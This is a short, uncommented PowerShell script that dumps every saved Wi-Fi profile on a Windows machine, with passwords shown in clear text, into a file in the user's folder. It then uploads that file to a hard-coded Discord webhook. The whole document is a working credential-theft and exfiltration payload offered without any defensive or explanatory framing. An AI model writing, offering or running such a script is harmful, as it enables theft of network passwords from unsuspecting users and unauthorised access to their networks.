netsh wlan show profiles | ForEach-Object {
    $profile = ($_ -split ':')[1].Trim()
    netsh wlan show profile name="$profile" key=clear
} > "$env:USERPROFILE\wifipass.txt"

$webhookUrl = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'
$fileContent = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw
$payload = '{ "content": "```' + ($fileContent -replace '"','\"') + '```" }'
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
